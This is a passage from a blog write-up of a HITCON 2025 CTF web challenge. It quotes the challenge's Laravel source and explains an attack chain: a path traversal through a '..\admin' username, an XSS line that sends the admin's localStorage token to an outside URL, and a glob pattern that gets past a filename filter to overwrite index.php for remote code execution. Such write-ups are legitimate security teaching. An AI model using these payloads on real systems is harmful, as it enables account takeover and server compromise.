        <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="n">is_admin</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="n">is_admin</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Corrected publicUrl logic</span>
            <span class="nv">$publicUrl</span> <span class="o">=</span> <span class="s2">"/api/announcement/"</span><span class="mf">.</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="nf">response</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">json</span><span class="p">([</span>
            <span class="s1">'message'</span> <span class="o">=&gt;</span> <span class="s1">'File uploaded successfully'</span><span class="p">,</span>
            <span class="s1">'path'</span> <span class="o">=&gt;</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">),</span>
            <span class="s1">'disk'</span> <span class="o">=&gt;</span> <span class="nv">$disk</span><span class="p">,</span>
            <span class="s1">'public_url'</span> <span class="o">=&gt;</span> <span class="nv">$publicUrl</span> <span class="c1">// Will be null if not public</span>
        <span class="p">],</span> <span class="mi">200</span><span class="p">);</span>
    <span class="p">}</span>
    
    <span class="k">public</span> <span class="k">function</span> <span class="n">servePublicAdminFile</span><span class="p">(</span><span class="nv">$filename</span> <span class="o">=</span> <span class="kc">null</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span> <span class="c1">// Extract actual filename</span>

        <span class="nv">$filePath</span> <span class="o">=</span> <span class="s1">'admin/'</span>  <span class="mf">.</span> <span class="nv">$filename</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nc">Storage</span><span class="o">::</span><span class="nf">disk</span><span class="p">(</span><span class="s1">'local'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">exists</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nf">response</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">json</span><span class="p">([</span><span class="s1">'error'</span> <span class="o">=&gt;</span> <span class="s1">'File not found.'</span><span class="p">],</span> <span class="mi">404</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="nc">Storage</span><span class="o">::</span><span class="nf">disk</span><span class="p">(</span><span class="s1">'local'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">response</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">);</span> <span class="c1">// Changed to response()</span>
    <span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>we can upload a file at /upload and retrieve it via GET /announcement/{filename} (handled by servePublicAdminFile()), but that method only serves files located under the admin/ directory</p>

<p>uploads to the admin/ directory require an admin session. therefore, if we get admin access, we can upload a file to admin/ and retrieve it through servePublicAdminFile(). when the response is served inline (e.g., text/html or image/svg+xml) without sanitization, this may result in xss</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre>    <span class="k">public</span> <span class="k">function</span> <span class="n">testFile</span><span class="p">(</span><span class="kt">Request</span> <span class="nv">$request</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$user</span> <span class="o">=</span> <span class="nc">Auth</span><span class="o">::</span><span class="nf">user</span><span class="p">();</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="n">username</span> <span class="o">!==</span> <span class="s1">'admin'</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nf">response</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">json</span><span class="p">(</span> <span class="p">[</span><span class="s1">'error'</span> <span class="o">=&gt;</span> <span class="s1">'Unauthenticated.'</span><span class="p">],</span> <span class="mi">401</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$file</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="nf">input</span><span class="p">(</span><span class="s2">"file"</span><span class="p">));</span>
        <span class="nv">$dst</span> <span class="o">=</span> <span class="nb">uniqid</span><span class="p">();</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/[\$;\n\r`\.&amp;|&lt;&gt;#\'"()*?:]|flag/'</span><span class="p">,</span> <span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nf">response</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">json</span><span class="p">([</span><span class="s1">'error'</span><span class="o">=&gt;</span><span class="s2">"Be a nice hacker"</span><span class="p">]);</span>
        <span class="p">}</span>
        <span class="nv">$file</span> <span class="o">=</span> <span class="s2">"../storage/app/private/admin/"</span> <span class="mf">.</span> <span class="nv">$file</span><span class="p">;</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
            <span class="k">return</span> <span class="nf">response</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">json</span><span class="p">([</span><span class="s1">'error'</span><span class="o">=&gt;</span><span class="s2">"</span><span class="nv">$file</span><span class="s2"> not exist"</span><span class="p">]);</span>
        <span class="p">}</span>
        <span class="nb">exec</span><span class="p">(</span><span class="s2">"cp </span><span class="nv">$file</span><span class="s2"> </span><span class="nv">$dst</span><span class="s2">"</span><span class="p">);</span>
        
        <span class="k">return</span> <span class="nf">response</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">json</span><span class="p">([</span><span class="s1">'output'</span> <span class="o">=&gt;</span> <span class="s2">"/</span><span class="nv">$dst</span><span class="s2">"</span><span class="p">]);</span>
    <span class="p">}</span>


    <span class="k">public</span> <span class="k">function</span> <span class="n">report</span><span class="p">(</span><span class="kt">Request</span> <span class="nv">$request</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$user</span> <span class="o">=</span> <span class="nc">Auth</span><span class="o">::</span><span class="nf">user</span><span class="p">();</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="n">username</span> <span class="o">===</span> <span class="s1">'admin'</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nf">response</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">json</span><span class="p">(</span> <span class="p">[</span><span class="s1">'error'</span> <span class="o">=&gt;</span> <span class="s1">'lonely?'</span><span class="p">],</span> <span class="mi">400</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="nf">input</span><span class="p">(</span><span class="s2">"url"</span><span class="p">);</span>
        <span class="nv">$cmd</span> <span class="o">=</span> <span class="s2">"node ../visitor.js "</span><span class="mf">.</span><span class="nb">escapeshellarg</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
        <span class="nb">exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
        <span class="k">return</span> <span class="nf">response</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">json</span><span class="p">([</span><span class="s1">'message'</span><span class="o">=&gt;</span><span class="s1">'ok'</span><span class="p">,</span> <span class="s2">"cmd"</span><span class="o">=&gt;</span><span class="nv">$cmd</span><span class="p">]);</span>
    <span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>the admin methods testFile() and report() are implemented as shown above. the testFile() method copies a file uploaded by either a user or the admin to a randomly named file generated via uniqid(). the report() method makes the admin (bot) visit a user-supplied url</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>    <span class="k">public</span> <span class="k">function</span> <span class="n">handle</span><span class="p">(</span><span class="kt">Request</span> <span class="nv">$request</span><span class="p">,</span> <span class="kt">Closure</span> <span class="nv">$next</span><span class="p">):</span> <span class="kt">Response</span>
    <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="nf">path</span><span class="p">()</span><span class="o">===</span><span class="s2">"api/login"</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nv">$next</span><span class="p">(</span><span class="nv">$request</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$dangerousWords</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'badword1'</span><span class="p">,</span> <span class="s1">'badword2'</span><span class="p">,</span> <span class="s1">'badword3'</span><span class="p">,</span> <span class="s1">'..'</span><span class="p">,</span> <span class="s1">'admin'</span><span class="p">];</span> <span class="c1">// Added '..'</span>
        <span class="nv">$rawBody</span> <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="nf">getContent</span><span class="p">();</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$rawBody</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$dangerousWords</span> <span class="k">as</span> <span class="nv">$word</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nb">stripos</span><span class="p">(</span><span class="nv">$rawBody</span><span class="p">,</span> <span class="nv">$word</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">return</span> <span class="nf">response</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">json</span><span class="p">([</span><span class="s1">'error'</span> <span class="o">=&gt;</span> <span class="s1">'Request contains dangerous words.'</span><span class="p">],</span> <span class="mi">403</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="nv">$next</span><span class="p">(</span><span class="nv">$request</span><span class="p">);</span>
    <span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>several routes pass through a middleware called DangerousWordFilter, which blocks requests if the raw body contains the substrings .. or admin</p>

<h2 id="try-to-register-as-admin"><span class="me-2">try to register as admin</span><a href="#try-to-register-as-admin" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p><a href="/assets/img/2025/Hitcon/1.png" class="popup img-link  shimmer"><img src="/assets/img/2025/Hitcon/1.png" alt="" loading="lazy"></a></p>

<p>since an admin account seemed necessary, i tried to register one, but the request was blocked by the DangerousWordFilter middleware</p>

<p><a href="/assets/img/2025/Hitcon/2.png" class="popup img-link  shimmer"><img src="/assets/img/2025/Hitcon/2.png" alt="" loading="lazy"></a></p>

<p>i also tried a unicode-encoded bypass; as shown above, the DangerousWordFilter can be circumvented, but the account cant be created because the username already exists. given that, the remaining path is to trigger XSS via the report() method and leak the admin bots session</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>    <span class="k">public</span> <span class="k">function</span> <span class="n">up</span><span class="p">():</span> <span class="kt">void</span>
    <span class="p">{</span>
        <span class="nc">Schema</span><span class="o">::</span><span class="nf">table</span><span class="p">(</span><span class="s1">'users'</span><span class="p">,</span> <span class="k">function</span> <span class="p">(</span><span class="kt">Blueprint</span> <span class="nv">$table</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$table</span><span class="o">-&gt;</span><span class="nf">string</span><span class="p">(</span><span class="s1">'username'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">unique</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">nullable</span><span class="p">();</span>
            <span class="nv">$table</span><span class="o">-&gt;</span><span class="nf">dropUnique</span><span class="p">(</span><span class="s1">'users_email_unique'</span><span class="p">);</span>
            <span class="nv">$table</span><span class="o">-&gt;</span><span class="nf">dropColumn</span><span class="p">(</span><span class="s1">'name'</span><span class="p">);</span>
            <span class="nv">$table</span><span class="o">-&gt;</span><span class="nf">dropColumn</span><span class="p">(</span><span class="s1">'email'</span><span class="p">);</span>
            <span class="nv">$table</span><span class="o">-&gt;</span><span class="nf">dropColumn</span><span class="p">(</span><span class="s1">'email_verified_at'</span><span class="p">);</span>
            <span class="nv">$table</span><span class="o">-&gt;</span><span class="nf">dropRememberToken</span><span class="p">();</span>
        <span class="p">});</span>
        <span class="nv">$pass</span> <span class="o">=</span> <span class="nv">$random</span> <span class="o">=</span> <span class="nc">Str</span><span class="o">::</span><span class="nf">random</span><span class="p">(</span><span class="mi">40</span><span class="p">);</span>
        <span class="no">DB</span><span class="o">::</span><span class="nf">table</span><span class="p">(</span><span class="s1">'users'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">insert</span><span class="p">([</span>
            <span class="s1">'username'</span> <span class="o">=&gt;</span> <span class="s1">'admin'</span><span class="p">,</span>
            <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="nc">Hash</span><span class="o">::</span><span class="nf">make</span><span class="p">(</span><span class="nv">$pass</span><span class="p">),</span>
        <span class="p">]);</span>
        <span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">'/tmp/ADMIN_PASS'</span><span class="p">,</span><span class="nv">$pass</span><span class="p">);</span>
    <span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="preview-via-announcements-feature"><span class="me-2">preview via announcements feature</span><a href="#preview-via-announcements-feature" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>    <span class="k">public</span> <span class="k">function</span> <span class="n">servePublicAdminFile</span><span class="p">(</span><span class="nv">$filename</span> <span class="o">=</span> <span class="kc">null</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span> <span class="c1">// Extract actual filename</span>

        <span class="nv">$filePath</span> <span class="o">=</span> <span class="s1">'admin/'</span>  <span class="mf">.</span> <span class="nv">$filename</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nc">Storage</span><span class="o">::</span><span class="nf">disk</span><span class="p">(</span><span class="s1">'local'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">exists</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nf">response</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">json</span><span class="p">([</span><span class="s1">'error'</span> <span class="o">=&gt;</span> <span class="s1">'File not found.'</span><span class="p">],</span> <span class="mi">404</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="nc">Storage</span><span class="o">::</span><span class="nf">disk</span><span class="p">(</span><span class="s1">'local'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">response</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">);</span> <span class="c1">// Changed to response()</span>
    <span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>we can upload files (e.g., html or php) via the /upload route, but to read them they must be served through /announcement. however, servePublicAdminFile() only serves files under admin/, while our uploads are confined to app/private/uploads/{username}, so we arent reachable via /announcement</p>

<h2 id="normalize-the-path-of-the-larevel"><span class="me-2">normalize the path of the larevel</span><a href="#normalize-the-path-of-the-larevel" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="kd">class</span> <span class="nc">WhitespacePathNormalizer</span> <span class="kd">implements</span> <span class="nc">PathNormalizer</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">normalizePath</span><span class="p">(</span><span class="kt">string</span> <span class="nv">$path</span><span class="p">):</span> <span class="kt">string</span>
    <span class="p">{</span>
        <span class="nv">$path</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'\\'</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">,</span> <span class="nv">$path</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">rejectFunkyWhiteSpace</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>

        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">normalizeRelativePath</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
    <span class="p">}</span>
    
<span class="c1">// https://github.com/thephpleague/flysystem/blob/2203e3151755d874bb2943649dae1eb8533ac93e/src/WhitespacePathNormalizer.php#L9</span>
</pre></td></tr></tbody></table></code></div></div>
<p>one important point: laravels filesystem normalizes paths via normalizePath(), which replaces backslashes (\) with forward slashes (/), what?</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>    <span class="k">public</span> <span class="k">function</span> <span class="n">upload</span><span class="p">(</span><span class="kt">Request</span> <span class="nv">$request</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="c1">// (...)</span>
        <span class="c1">// Sanitize username</span>
        <span class="nv">$username</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="n">username</span><span class="p">);</span> <span class="c1">// Ensure no path traversal in username</span>

        <span class="c1">// Determine disk and path based on admin status</span>
        <span class="nv">$disk</span> <span class="o">=</span> <span class="s1">'local'</span><span class="p">;</span>
        <span class="nv">$basePath</span> <span class="o">=</span> <span class="s1">'uploads/'</span> <span class="mf">.</span> <span class="nv">$username</span><span class="p">;</span>
        
        <span class="c1">// (...)</span>
    <span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>uploaded files are saved under app/private/uploads/{username}, and {username} is the login ID. If we register with a username like ..\admin (using backslashes), laravels path normalization will convert backslashes to forward slashes, turning it into ../admin. That means the resolved path becomes app/private/uploads/../admin, enabling a path traversal that escapes the uploads directory into admin/ amen..</p>

<p><a href="/assets/img/2025/Hitcon/3.png" class="popup img-link  shimmer"><img src="/assets/img/2025/Hitcon/3.png" alt="" loading="lazy"></a></p>

<p>and since the auth_token is in local storage rather than a cookie, we can write a pocto leak the auth_token like this: &lt;script&gt;fetch(url + localStorage.auth_token)&lt;/script&gt;</p>

<h2 id="gadget-chain-that-leads-to-rce"><span class="me-2">gadget chain that leads to rce</span><a href="#gadget-chain-that-leads-to-rce" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre>    <span class="k">public</span> <span class="k">function</span> <span class="n">testFile</span><span class="p">(</span><span class="kt">Request</span> <span class="nv">$request</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$user</span> <span class="o">=</span> <span class="nc">Auth</span><span class="o">::</span><span class="nf">user</span><span class="p">();</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="n">username</span> <span class="o">!==</span> <span class="s1">'admin'</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nf">response</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">json</span><span class="p">(</span> <span class="p">[</span><span class="s1">'error'</span> <span class="o">=&gt;</span> <span class="s1">'Unauthenticated.'</span><span class="p">],</span> <span class="mi">401</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$file</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="nf">input</span><span class="p">(</span><span class="s2">"file"</span><span class="p">));</span>
        <span class="nv">$dst</span> <span class="o">=</span> <span class="nb">uniqid</span><span class="p">();</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/[\$;\n\r`\.&amp;|&lt;&gt;#\'"()*?:]|flag/'</span><span class="p">,</span> <span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nf">response</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">json</span><span class="p">([</span><span class="s1">'error'</span><span class="o">=&gt;</span><span class="s2">"Be a nice hacker"</span><span class="p">]);</span>
        <span class="p">}</span>
        <span class="nv">$file</span> <span class="o">=</span> <span class="s2">"../storage/app/private/admin/"</span> <span class="mf">.</span> <span class="nv">$file</span><span class="p">;</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
            <span class="k">return</span> <span class="nf">response</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">json</span><span class="p">([</span><span class="s1">'error'</span><span class="o">=&gt;</span><span class="s2">"</span><span class="nv">$file</span><span class="s2"> not exist"</span><span class="p">]);</span>
        <span class="p">}</span>
        <span class="nb">exec</span><span class="p">(</span><span class="s2">"cp </span><span class="nv">$file</span><span class="s2"> </span><span class="nv">$dst</span><span class="s2">"</span><span class="p">);</span>
        
        <span class="k">return</span> <span class="nf">response</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">json</span><span class="p">([</span><span class="s1">'output'</span> <span class="o">=&gt;</span> <span class="s2">"/</span><span class="nv">$dst</span><span class="s2">"</span><span class="p">]);</span>
    <span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>now that weve stolen the admins token via an xss, we can call the testFile() method to copy the contents of a file containing php code into index.php</p>

<p><a href="/assets/img/2025/Hitcon/4.png" class="popup img-link  shimmer"><img src="/assets/img/2025/Hitcon/4.png" alt="" loading="lazy"></a></p>

<p>when we upload a php file, its saved with a randomized name that has no dot/extension, e.g., nuTClk15eXNn73c6RchkiAQrQfmZktW8qDL12C0p</p>

<p>if we call the testFile() so that it effectively runs <code class="language-plaintext highlighter-rouge">cp nuTClk15eXNn73c6RchkiAQrQfmZktW8qDL12C0p index.php</code>, public/index.php would be overwritten with the malicious php code. however, because the method validates the filename against <code class="language-plaintext highlighter-rouge">/[\$;\n\r.&amp;|&lt;&gt;#'"()*?:]|flag/</code>, we cant use index.php` as the target (the dot is disallowed), so i just decided to ask to chatgpt hah</p>

<p><a href="/assets/img/2025/Hitcon/5.png" class="popup img-link  shimmer"><img src="/assets/img/2025/Hitcon/5.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/2025/Hitcon/6.png" class="popup img-link  shimmer"><img src="/assets/img/2025/Hitcon/6.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/2025/Hitcon/7.png" class="popup img-link  shimmer"><img src="/assets/img/2025/Hitcon/7.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/2025/Hitcon/8.png" class="popup img-link  shimmer"><img src="/assets/img/2025/Hitcon/8.png" alt="" loading="lazy"></a></p>

<p>as a result, i saw chatgpt mention globs vs regex and began looking it up. a glob lets the shell match filenames using wildcard patterns. among these, we can use square brackets to define character classes or ranges in the pattern</p>

<p><a href="/assets/img/2025/Hitcon/9.png" class="popup img-link  shimmer"><img src="/assets/img/2025/Hitcon/9.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/2025/Hitcon/10.png" class="popup img-link  shimmer"><img src="/assets/img/2025/Hitcon/10.png" alt="" loading="lazy"></a></p>

<p>after several tests, one pattern worked reliably. the glob index[!abc]php matches any filename with exactly one character between index and php that is not abc. snce index.php has a dot (.) in that position, it matches this pattern</p>

<p>after registering a user with the username ..\admin, any upload lands under the /admin directory. we first upload an xss payload there and send its URL to the admin bot to leak the admin token. then we upload a file containing php code and call the testFile() using a square-bracket glob so that it matches index.php, overwriting it and triggering rce</p>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/ctf/"
            class="post-tag no-text-decoration"
          >CTF</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Hitcon%202025%20Note%20Write%20Up%20-%20Web2.0&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHitcon-CTF-2025%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Hitcon%202025%20Note%20Write%20Up%20-%20Web2.0&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHitcon-CTF-2025%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHitcon-CTF-2025%2F&text=Hitcon%202025%20Note%20Write%20Up%20-%20Web2.0" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get the last 5 posts from lastmod list. -->















              <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->














  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
